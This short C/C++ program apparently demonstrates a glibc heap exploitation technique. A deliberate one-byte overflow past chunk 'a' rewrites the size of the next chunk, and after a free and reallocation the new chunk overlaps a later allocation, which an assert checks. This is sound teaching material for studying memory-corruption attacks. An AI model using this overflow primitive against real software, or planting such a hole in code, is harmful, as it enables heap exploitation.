#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>
#include <iostream>

int main()
{
	uint8_t* updater = (uint8_t*) malloc(0x20);
	int size = 0x78;
	uint8_t* a = (uint8_t*) malloc(size);
	uint8_t* b = (uint8_t*) malloc(0x10);
	uint8_t* reader = (uint8_t*) malloc(size);
	
	printf("a, b, reader = %p, %p, %p\n", a, b, reader);

	int a_size = malloc_usable_size(a);
	int b_size = malloc_usable_size(b);
	
	uint64_t* b_size_ptr = (uint64_t*) (b - 8);
	
	printf("a usable size, b size val = %#lx, %#lx\n", a_size, *b_size_ptr);
	
	uint8_t attack_size = 0x71;

	//1 byte attack
	a[size] = attack_size;
	
	printf("b size val = %#lx\n", *b_size_ptr);
	
	free(b);
	
	//create dangling chunk
	
	uint8_t* chunk = (uint8_t*) malloc(attack_size - 17);
	
	printf("chunk = %p, blocker + 0x10 == c: %i\n", chunk, chunk + 0x20 == reader);
	printf("chunk %p\n", chunk); 
	
	assert((chunk + 0x20 == reader));
	
	free(a);
	free(chunk);
	free(reader);
	
	return 0;
}
